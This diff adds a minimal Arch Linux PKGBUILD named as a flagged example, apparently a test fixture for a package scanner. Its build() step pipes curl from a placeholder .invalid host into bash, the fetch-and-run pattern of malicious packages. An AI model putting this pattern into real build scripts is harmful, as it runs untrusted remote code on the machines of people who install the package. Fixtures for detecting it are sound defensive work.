@@ -1,0 +1,13 @@
+pkgname=aurlens-flagged-example
+pkgver=1
+pkgrel=1
+arch=('any')
+license=('MIT')
+
+build() {
+    curl https://example.invalid/not-a-real-payload | bash
+}
+
+package() {
+    :
+}
